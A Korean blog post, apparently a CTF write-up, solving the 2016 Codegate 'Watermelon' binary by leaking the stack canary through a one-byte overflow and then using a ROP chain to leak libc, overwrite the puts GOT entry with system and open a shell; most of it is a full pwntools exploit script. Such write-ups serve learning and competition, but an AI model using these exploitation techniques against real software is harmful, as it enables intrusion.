---
title: "2016 Codegate Watermelon"
date: 2019-11-13
tags: [Codegate]
categories: [Codegate]
---

이름을 입력하는 곳을 보면 전역변수(bss) 영역에 scanf를 받게 된다.

add, view, modify에 들어가는 인자가 4400만큼 할당받는다.

add함수에서는 어떠한 전역변수 하나가 100인지 비교하고 아니면 곡 추가하고 증가해주는 거 보면 곡의 인덱스인거 같다.

playlist 구조체 : num(4) + music(20) + artist(20)

이러한 구조체가 100개 있는 것이다.

```c
int playlist_struct; // [esp+1Ch] [ebp-113Ch]
unsigned int canary; // [esp+114Ch] [ebp-Ch]
구조체(4400) + canary()
```

add() : 1byte overflow

view() : playlist view -> view canary

modify() : overflow 

Canary Leak 시나리오

> add()로 playlist 100개 채우는데 마지막에 artist만 21개 입력해서 Canary Leak해준다.
>
> view()로 가서 Leak된 Canary를 알아온다.
>
> modify()로 가서 bof 일으키고 Canary 값 맞춰주면서 ROP 해주면 된다.

```python
from pwn import *
 
context.log_level = 'debug'
context.arch = 'i386'
 
p = process('./watermelon')
libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)
e = ELF('./watermelon')
 
sla = lambda x,y : p.sendlineafter(x,y)
sl = lambda x : p.sendline(x)
sa = lambda x,y : p.sendafter(x,y)
s = lambda x : p.send(x)
 
popret = 0x080484d1 # 0x080484d1 : pop ebx ; ret
pop3ret = 0x080495ad # 0x080495ad : pop ebx ; pop edi ; pop ebp ; ret
bss = e.bss()
 
def add():
    sla('\tselect\t|\t\n','1')
    sla('\tmusic\t|\t','A')
    sla('\tartist\t|\t','A')
 
if __name__ == '__main__':
    sla('name : \n','realsung')
    for i in range(99):
        add()
    sla('\tselect\t|\t\n','1')
    sla('\tmusic\t|\t','A')
    sla('\tartist\t|\t','A'*21)
 
    sla('\tselect\t|\t\n','2')
    p.recvuntil('A'*20)
    canary = u32(p.recv(4)) - ord('A')
    log.info('canary : ' + hex(canary))
 
    ########################################
 
    sla('\tselect\t|\t\n','3')
    sla('select number\t|\t\n','100')
    sla('\tmusic\t|\t','B')
 
    # artist(20) + canary(4) + dummy(8) + sfp(4) + ret 
    pay = 'A'*20
    pay += p32(canary)
    pay += 'A'*12
    pay += flat(e.plt['puts'],popret,e.got['puts'])
    pay += flat(e.plt['read'],pop3ret,0,bss,10)
    pay += flat(e.plt['read'],pop3ret,0,e.got['puts'],8)
    pay += flat(e.plt['puts'],'AAAA',bss) 
    sla('\tartist\t|\t',pay)
 
    sla('\tselect\t|\t\n','4')
 
    p.recvuntil('BYE BYE\n\n')
    puts = u32(p.recv(4))
    log.info('puts : ' + hex(puts))
    libc_base = puts - libc.symbols['puts']
    log.info('libc_base : ' + hex(libc_base))
    system = libc_base + libc.symbols['system']
    log.info('system : ' + hex(system))
 
    sl('/bin/sh\x00')
    s(p32(system))
 
p.interactive()
```

